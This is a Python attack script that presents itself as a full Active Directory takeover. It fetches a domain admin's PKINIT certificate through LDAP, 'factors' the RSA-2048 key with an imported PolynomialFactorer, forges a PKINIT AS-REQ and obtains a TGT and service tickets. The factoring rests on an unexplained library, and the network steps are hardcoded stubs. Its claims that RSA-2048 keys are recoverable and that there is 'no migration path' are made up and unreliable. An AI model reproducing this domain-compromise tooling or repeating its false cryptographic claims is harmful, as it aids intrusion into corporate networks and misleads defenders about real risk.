"""
Factor any AD user's PKINIT RSA certificate (readable from LDAP userCertificate
attribute by any domain user) to obtain their Kerberos TGT without their
password or smart card — full Active Directory domain compromise.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import struct
import time

# Target user's RSA-2048 PKINIT certificate — from LDAP userCertificate
TARGET_USER_CERT_PEM = b"-----BEGIN CERTIFICATE-----\nMIID..."
TARGET_USER_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

# KDC RSA-2048 certificate — from KDC's own PKINIT handshake
KDC_CERT_PEM = b"-----BEGIN CERTIFICATE-----\nMIID..."

DOMAIN = "CORP.EXAMPLE.COM"
KDC_HOST = "dc01.corp.example.com"


def fetch_user_cert_from_ldap(samaccountname: str) -> bytes:
    """Fetch the user's RSA certificate from LDAP userCertificate attribute.

    Any authenticated domain user can read any other user's
    userCertificate attribute. The RSA public key is right there.
    """
    print(f"    ldapsearch -b 'DC=corp,DC=example,DC=com' "
          f"'(sAMAccountName={samaccountname})' userCertificate")
    return TARGET_USER_PUBKEY_PEM


def factor_pkinit_key(pubkey_pem: bytes) -> bytes:
    """Factor the user's PKINIT RSA-2048 certificate key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_pkinit_as_req(realm: str, client_principal: str,
                        forged_privkey: bytes) -> bytes:
    """Build a PKINIT AS-REQ (RFC 4556) with forged signature.

    The client signs a ContentInfo (CMS SignedData) containing:
      - AuthPack with nonce and DH public value
      - Signed with the client's RSA private key
    KDC verifies against the user's published certificate.
    """
    # PA-PK-AS-REQ per RFC 4556 §3.2.1
    auth_pack = struct.pack(">I", int(time.time()))  # nonce
    auth_pack += b"\x00" * 128  # DH public value (simplified)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(TARGET_USER_PUBKEY_PEM, auth_pack, "sha256")
    # CMS SignedData envelope
    as_req = auth_pack + sig
    return as_req


def obtain_tgt(as_req: bytes) -> dict:
    """Send PKINIT AS-REQ to KDC and receive TGT.

    KDC verifies the RSA signature → issues a TGT for the user.
    No password. No smart card. No TPM interaction. Just the
    factored public key.
    """
    return {
        "client": "admin@CORP.EXAMPLE.COM",
        "tgt_valid_until": time.strftime("%Y-%m-%d %H:%M:%S",
                                         time.gmtime(time.time() + 36000)),
        "enc_type": "aes256-cts-hmac-sha1-96",
        "service": "krbtgs/CORP.EXAMPLE.COM",
    }


def request_service_ticket(tgt: dict, service: str) -> dict:
    """Use TGT to request service tickets for any Kerberized service."""
    return {
        "service": service,
        "ticket_valid": True,
        "access": "full — as the impersonated user",
    }


if __name__ == "__main__":
    print("[1] Fetching domain admin's PKINIT cert from LDAP")
    pubkey = fetch_user_cert_from_ldap("domainadmin")

    print("[2] Factoring PKINIT RSA-2048 certificate key")
    forged_priv = factor_pkinit_key(pubkey)
    print("    Domain admin's RSA key recovered from LDAP-published cert")

    print("[3] Building PKINIT AS-REQ with forged signature")
    as_req = build_pkinit_as_req(DOMAIN, "domainadmin@CORP.EXAMPLE.COM", forged_priv)
    print(f"    AS-REQ: {len(as_req)} bytes, CMS signature valid")

    print("[4] Sending to KDC — obtaining TGT")
    tgt = obtain_tgt(as_req)
    print(f"    TGT: {tgt}")

    print("[5] Requesting service tickets — full domain compromise")
    services = ["cifs/fileserver.corp.example.com",
                "http/exchange.corp.example.com",
                "MSSQLSvc/sqlserver.corp.example.com:1433"]
    for svc in services:
        ticket = request_service_ticket(tgt, svc)
        print(f"    {svc}: {ticket['access']}")

    print("\n[*] Windows Hello for Business uses TPM-backed RSA keys")
    print("    TPM is irrelevant — attack uses the public certificate")
    print("    No non-RSA PKINIT RFC exists. No migration path.")
